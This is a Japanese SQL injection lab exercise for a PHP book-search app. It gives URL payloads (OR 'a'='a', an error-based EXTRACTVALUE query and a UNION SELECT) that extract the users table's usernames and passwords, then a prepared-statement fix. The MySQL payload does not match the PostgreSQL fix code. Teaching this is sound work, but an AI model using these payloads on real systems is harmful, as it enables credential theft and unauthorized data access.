## 演習

### アプリケーションの起動

以下のコマンドをターミナルで実行してみましょう。

```bash
docker-compose up
```

### アプリケーションの概要

このアプリケーションでは`search.php`の後に`?author=example`のような形で著者名による書籍データベース検索をします。
authorのパラメータに設定された文字列をそのままチェック等一切なしでSQL文に組み込んでいるため、SQLインジェクションができてしまいます。

正常な実行結果の例としては`https://<擬似ブラウザに表示されているドメイン>/search.php?author=Atabasca`を実行してみてください。

### 攻撃

1. `https://<擬似ブラウザに表示されているドメイン>/search.php?author='+OR+'a'='a` というURLでauthorパラメータを設定してアクセスする。
2. 実行された結果として、著者名に関係なく書籍データベースが取得できてしまう。
3. `https://<擬似ブラウザに表示されているドメイン>/search.php?author='+AND+EXTRACTVALUE(0,(SELECT+CONCAT('$',username,':',password)+FROM+users+LIMIT+0,1))+%23`というURLで同様にアクセスする。
4. 実行された結果、エラーメッセージとして`Unknown XPATH variable at: '$guest:...'`という形で、同じデータベースの別のテーブルとして入っているusername/passwordの組を取得できてしまう。
5. `https://<擬似ブラウザに表示されているドメイン>/search.php?author='+UNION+SELECT+username,password,NULL,NULL+FROM+users--+%60`というURLで同様にアクセスする。
6. 今度はテーブルの「ID」の欄にusername、「タイトル」の欄にpasswordが表示される形でテーブルusersの内容全部が取得できてしまう。

### 攻撃の対策

search.phpをプレースホルダを使うように書き換えることで脆弱性をなくすことができます。具体的には最初のデータベースをアクセスする部分は以下のように書き換えます。

```php
<?php
    session_start();
    header("X-XSS-Protection: 0;");
    $author = $_GET['author'];
    try {
        $options = array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_EMULATE_PREPARES => false);
        $dbname = 'pgsql:host=' . $_ENV['DATABASE_HOST'] . ';dbname=sampledb;options=\'--client_encoding=UTF8\'';
        $dbh = new PDO($dbname, 'root', '', $options);
        $sqlcode = "SELECT * FROM booklist WHERE author = ? ORDER BY id";
        $result = $dbh->prepare($sqlcode);
        $result->bindValue(1, $author, PDO::PARAM_STR);
        $result->execute();
?>
```
